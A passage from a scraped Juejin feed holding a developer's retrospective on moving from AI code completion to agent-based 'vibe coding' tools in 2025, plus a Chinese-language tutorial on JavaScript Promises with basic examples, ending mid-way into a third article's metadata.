  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T06:44:55.000Z" title="Thu Jan 01 2026 06:44:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18b575bc3033442fa27feda20d09170e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS29uYXRhXzk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767854695&amp;x-signature=yuGws%2F1cWtMLeS5Y0VNxvb1HVjU%3D" alt="" loading="lazy"/></p>
<p>2025 年了，Vibe Coding 早已不再是陌生的概念。无论你是否抗拒，AI 都已经像空气一样，无声无息地融入了我们的工作流。</p>
<p>回顾这一年，AI 在我手中完成了一场从“单纯的补全工具”到“全能数字助手”的进化。这不仅改变了我的代码，更彻底重塑了我的工作方式——以及我对“写代码”这件事的理解。</p>

<h2 data-id="heading-0">阶段一：免费党的“最后倔强”</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56a081aba728479a8fe2185d6cf05d53~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS29uYXRhXzk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767854695&amp;x-signature=9KFFpTFK8t5sMvom%2BDWo22BFbCc%3D" alt="" loading="lazy"/></p>
<p>最初接触 AI 编程，是从 Tabnine 开始的。当时它还是个免费的 VSCode 插件，虽然没有现在这么强大的上下文分析能力，但那种“刚想打字，它就猜到了”的体验，确实让人愉悦。</p>
<p>只是好景不长，Tabnine 忽然开始收费了。</p>
<p>单单为一个补全功能付费，我是不太愿意的。毕竟在智能补全出来前，我们也照样写代码不是？（不得不说，程序员在某些方面是有点抠门）。</p>
<p>好在程序员的世界里从不缺竞品。恰巧那时我又在重拾 Vim，这让我发现了 Codeium（也就是 Windsurf 的前身）。它不仅对个人用户免费，还完美支持 Vim，得益于大模型的加持，其智能补全体验甚至更上一层楼。在实际开发中，我几乎只需要一路 <code>Tab</code> 就可以完成大部分样板代码，顺便还能用对话功能让 AI 帮我写个标准的 JSDoc。</p>
<p>那时候，我觉得这就够了：<strong>一个更快的打字机，一个随叫随到的文档查阅员。</strong></p>
<h2 data-id="heading-1">阶段二：一半是工具，一半是搬运工</h2>
<p>随着 ChatGPT 的爆火，国产大模型 DeepSeek、Qwen 等也如雨后春笋般涌现。</p>
<p>在这个阶段，我的工作流变得有些割裂：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcb5fca334464a09a27ac0a96fe74f2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS29uYXRhXzk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767854695&amp;x-signature=c6x09Po3VSz5qesg6frNAlUjs5c%3D" alt="" loading="lazy"/></p>
<ol>
<li>先在网页端和 GPT 们分析需求、比较方案，让它生成架构和设计。</li>
<li>我充当“人肉搬运工”，把代码复制回 IDE。</li>
<li>再用 Codeium 补全细节。</li>
<li>最后由我 Review 代码并组织布局。</li>
</ol>
<p>当时的 AI 对我来说，就是一个更“聪明”的搜索引擎。虽然省去了一个个翻看网页的时间，但这种在浏览器和 IDE 之间反复横跳的感觉，总是打断心流。</p>
<p>此时 Cursor 其实已经坐稳了 AI IDE 的头把交椅，但 20 刀一个月的价格，加上当时对 Vim 支持的不完善，让我这个“抠门”的 Vim 党始终没有动力去尝试。</p>
<h2 data-id="heading-2">阶段三：那个凌晨的转折点</h2>
<p>没过多久，Windsurf 作为 Cursor 的有力竞品出现了。同样内置当时最强的 Claude 3.5，每月 15 刀比 Cursor 便宜，而且它是 Codeium 团队做的，质量有保障。</p>
<p>这一次，我没有犹豫，直接订阅支持（也算是对 Codeium 长期免费的认可）。</p>
<p>起初，我还是把它当成超级补全工具用。直到有一次，为了修复一个紧急的生产 Bug，我加班到了凌晨。头昏脑胀之际，看着复杂的调用链，我突然想：<strong>“既然 Agent 被吹得那么神，不如让它试试？”</strong> 反正实在不行再自己上。</p>
<p>我试着把报错信息和需求丢给 Cascade（Windsurf 的 Agent），然后双手离开键盘，去茶水间泡了杯咖啡。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8af6735d29094a10939a222fd61b2f36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS29uYXRhXzk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767854695&amp;x-signature=4khdBMkUHAD1CC8yDaJChLykHfI%3D" alt="" loading="lazy"/></p>
<p>接下来的几分钟，我一边喝着咖啡，一边看着屏幕上的光标自己在文件间穿梭：定位问题、修改代码、运行测试、报错、再修改……尽管来回交互了 4、5 轮，中间有些错误定位甚至让我觉得有点滑稽，但最终，它成功修复了 Bug 并补全了单元测试。</p>
<p>那一刻，疲惫感消散了不少。<strong>它拯救的不只是代码，更是处于水深火热中的我。</strong> 至少那一天，我不用坐着首班车回家了。</p>
<p>正是从这一次开始，AI 不再只是一个工具，它真正成为了我的<strong>助手</strong>。我开始习惯把具体的实现丢给 AI，而我则退后一步，更多地负责代码审核、需求拆解和架构把控。</p>
<h2 data-id="heading-3">阶段四：Vibe Coding 的完全体</h2>
<p>然而，工具圈的变动总是来得猝不及防。Windsurf 因外部原因被切断了内置 Claude 3.5 的供应，使用体验大打折扣。而我又因为总是用不满额度，开始琢磨怎么给这每月 15 刀的订阅费“降本增效”。</p>
<p>好在，<strong>Trae</strong> 来了。</p>
<p>极致的性价比、字节出品的光环，外加原生集成的 Claude 3.5 模型（当时），简直太符合我的需求了。自从用了 Agent 后，我又从 Vim 回到了 IDE。趁着 Windsurf 到期，我转头就投入了 Trae 的怀抱。</p>
<p>此时的 Agent 已经成熟不少，配合 Rules 和各类 MCP（Model Context Protocol），已经可以在 IDE 中一站式完成从需求讨论、设计到实现的完整流程。一个月的优惠期过去后，我毫不犹豫地升级成了包年订阅。</p>
<p>尽管后来 Trae 也经历了 Claude 模型断供的风波，但此时各家厂商的模型能力也都在不断提升。Gemini、MiniMax、老牌 GPT 等能力也足够补位。至少在我的使用体验上，Gemini 并不逊色于 Claude。</p>
<p>到了现在，AI 早已超越了“代码补全”的范畴。Claude Code 和 Trae 的 SOLO 模式，更是进一步将我们从编码这项体力活中解放了出来。</p>
<p>除了日常开发，我还挖掘出了其他“邪修”玩法。比如，利用 Rules 将 IDE 改造为写作助手，帮我对文章进行润色和修改——<strong>是的，就比如你现在读到的这一篇。</strong></p>
<h2 data-id="heading-4">什么是 Vibe Coding？</h2>
<p>很难想象，仅仅一年，AI 就从代码补全工具进化到了实际助手。飞速迭代的不仅是技术，更是我们开发者的认知。</p>
<p>所以，现在回头再看 Vibe Coding。它大概就是：当你有一个想法时，不用再被繁琐的语法和样板代码卡住。你的思维在流动，AI 帮你铺路。你不再只是一个 Code Writer，你更像是一个 Creator。</p>
<p>2025 年，从工具到助手，这段旅程才刚刚开始。而 2026，精彩仍将继续。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eba65f19f0e3444a971bd3f44bbef43c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS29uYXRhXzk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767854695&amp;x-signature=Gyvb%2FdQtRT0o3l2ik6u%2BEQal3SM%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>也欢迎关注我的公众号：此方的手帐
每周固定周刊更新，同时和你分享工作学习中的感悟</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Promise的总结]]></title>    <link>https://juejin.cn/post/7589940913766629411</link>    <guid>https://juejin.cn/post/7589940913766629411</guid>    <pubDate>2026-01-01T04:47:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940913766629411" data-draft-id="7589870367764480040" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Promise的总结"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-01T04:47:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Yesterday不想说话"/> <meta itemprop="url" content="https://juejin.cn/user/2471357870517038"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Promise的总结
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2471357870517038/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Yesterday不想说话
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T04:47:33.000Z" title="Thu Jan 01 2026 04:47:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">一、基本概念</h3>
<ul>
<li><strong>Promise</strong> 是异步编程的解决方案，用于处理异步操作</li>
<li>代表一个<strong>未来才会知道结果</strong>的事件（通常是异步操作）</li>
<li>状态一旦改变就<strong>不会再变</strong></li>
</ul>
<h3 data-id="heading-1">二、三种状态</h3>
<ol>
<li><strong>pending（进行中）</strong>  - 初始状态</li>
<li><strong>fulfilled（已成功）</strong>  - 操作成功完成</li>
<li><strong>rejected（已失败）</strong>  - 操作失败</li>
</ol>
<p><strong>状态转换：</strong><br/>
<code>pending</code> → <code>fulfilled</code> 或 <code>pending</code> → <code>rejected</code></p>
<h3 data-id="heading-2">三、基本用法</h3>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> promise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  <span class="hljs-comment">// 异步操作</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-comment">/* 成功 */</span>) {
    <span class="hljs-title function_">resolve</span>(value);  <span class="hljs-comment">// 状态变为fulfilled</span>
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">reject</span>(error);   <span class="hljs-comment">// 状态变为rejected</span>
  }
});

promise.<span class="hljs-title function_">then</span>(
  <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> { <span class="hljs-comment">/* 成功处理 */</span> },
  <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> { <span class="hljs-comment">/* 失败处理 */</span> }
);
</code></pre>
<h3 data-id="heading-3">四、实例方法</h3>
<h4 data-id="heading-4">1. <strong>then()</strong>  - 主要处理方法</h4>
<p>javascript</p>
<pre><code class="hljs language-arduino" lang="arduino">promise.<span class="hljs-built_in">then</span>(
  onFulfilled,  <span class="hljs-comment">// 成功回调</span>
  onRejected    <span class="hljs-comment">// 失败回调（可选）</span>
);
</code></pre>
<h4 data-id="heading-5">2. <strong>catch()</strong>  - 错误处理</h4>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">promise.catch(<span class="hljs-attr">error</span> =&gt; {
  // 处理错误（等同于then(null, onRejected)）
})<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-6">3. <strong>finally()</strong>  - 最终执行</h4>
<p>javascript</p>
<pre><code class="hljs language-dart" lang="dart">promise.<span class="hljs-keyword">finally</span>(() =&gt; {
  <span class="hljs-comment">// 无论成功失败都会执行</span>
});
</code></pre>
<h3 data-id="heading-7">五、静态方法</h3>
<h4 data-id="heading-8">1. <strong>Promise.resolve()</strong>  - 创建已完成的Promise</h4>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">Promise.resolve(value)<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-9">2. <strong>Promise.reject()</strong>  - 创建已拒绝的Promise</h4>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">Promise.reject(reason)<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-10">3. <strong>Promise.all()</strong>  - 所有完成才完成</h4>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">Promise.all(<span class="hljs-section">[p1, p2, p3]</span>)
  .then(<span class="hljs-attr">values</span> =&gt; { /* 所有都成功 */ })
  .catch(<span class="hljs-attr">error</span> =&gt; { /* 有一个失败就失败 */ })<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-11">4. <strong>Promise.race()</strong>  - 竞速，第一个完成/拒绝的</h4>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">Promise.race(<span class="hljs-section">[p1, p2, p3]</span>)
  .then(<span class="hljs-attr">value</span> =&gt; { /* 第一个完成的 */ })<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-12">5. <strong>Promise.allSettled()</strong>  - 所有都完成（无论成功失败）</h4>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">Promise.allSettled(<span class="hljs-section">[p1, p2, p3]</span>)
  .then(<span class="hljs-attr">results</span> =&gt; { /* 所有promise都已完成 */ })<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-13">6. <strong>Promise.any()</strong>  - 任意一个成功就成功</h4>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">Promise.any(<span class="hljs-section">[p1, p2, p3]</span>)
  .then(<span class="hljs-attr">value</span> =&gt; { /* 第一个成功的 */ })<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-14">六、链式调用</h3>
<p>javascript</p>
<pre><code class="hljs language-dart" lang="dart">promise
  .then(value =&gt; { <span class="hljs-comment">/* 第一步 */</span> })
  .then(value =&gt; { <span class="hljs-comment">/* 第二步 */</span> })
  .<span class="hljs-keyword">catch</span>(error =&gt; { <span class="hljs-comment">/* 错误处理 */</span> })
  .<span class="hljs-keyword">finally</span>(() =&gt; { <span class="hljs-comment">/* 清理 */</span> });
</code></pre>
<p><strong>特点：</strong></p>
<ul>
<li>每个<code>then()</code>返回<strong>新的Promise</strong></li>
<li>可以传递值给下一个<code>then()</code></li>
<li>错误会沿着链向后传递</li>
</ul>
<h3 data-id="heading-15">七、错误处理最佳实践</h3>
<p>javascript</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 推荐：使用catch处理错误</span>
promise
  <span class="hljs-selector-class">.then</span>(handleSuccess)
  <span class="hljs-selector-class">.catch</span>(handleError);

<span class="hljs-comment">// 避免：then中第二个参数和catch混用</span>
promise
  <span class="hljs-selector-class">.then</span>(handleSuccess, handleError)  <span class="hljs-comment">// 可能无法捕获then中的错误</span>
  <span class="hljs-selector-class">.catch</span>(handleOtherError);           <span class="hljs-comment">// 可能不会执行</span>
</code></pre>
<h3 data-id="heading-16">八、与async/await结合</h3>
<p>javascript</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">async</span> function <span class="hljs-title">fetchData</span>()</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> promise;
    <span class="hljs-comment">// 处理结果</span>
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-comment">// 处理错误</span>
  }
}
</code></pre>
<h3 data-id="heading-17">九、优缺点</h3>
<p><strong>优点：</strong></p>
<ol>
<li>解决<strong>回调地狱</strong>，代码更清晰</li>
<li>更好的错误处理机制</li>
<li>支持链式调用</li>
<li>提供了丰富的静态方法</li>
</ol>
<p><strong>缺点：</strong></p>
<ol>
<li>无法取消Promise</li>
<li>错误需要显式捕获</li>
<li>状态单一，不能监听进度</li>
</ol>
<h3 data-id="heading-18">十、常见使用场景</h3>
<ol>
<li><strong>AJAX请求</strong> - 替代XMLHttpRequest</li>
<li><strong>定时器操作</strong> - setTimeout封装</li>
<li><strong>文件读取</strong> - Node.js文件操作</li>
<li><strong>数据库操作</strong> - 异步查询</li>
<li><strong>多个异步操作协调</strong> - 使用Promise.all等</li>
</ol>
<h3 data-id="heading-19">十一、注意事项</h3>
<ol>
<li><strong>Promise内部错误会被吞没</strong>，必须使用catch</li>
<li><strong>Promise创建即执行</strong>，不能中途取消</li>
<li><strong>状态不可逆</strong>，一旦改变无法回退</li>
<li><strong>then()中的错误</strong>需要显式处理</li>
</ol>
<h3 data-id="heading-20">十二、现代JavaScript实践</h3>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ES2020+ 推荐写法</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchUser</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">userId</span>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">${userId}</span>`</span>);
    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Network error'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Fetch failed:'</span>, error);
    <span class="hljs-keyword">throw</span> error; <span class="hljs-comment">// 重新抛出</span>
  }
};
</code></pre>
<p>Promise是现代JavaScript异步编程的核心，虽然现在有async/await语法糖，但理解Promise是掌握JavaScript异步编程的基础。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何使用 LangChain 和 Elasticsearch 构建 agent 知识库]]></title>    <link>https://juejin.cn/post/7589903499599233078</link>    <guid>https://juejin.cn/post/7589903499599233078</guid>    <pubDate>2026-01-01T05:41:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589903499599233078" data-draft-id="7589838742552215571" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何使用 LangChain 和 Elasticsearch 构建 agent 知识库"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2026-01-01T05:41:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" 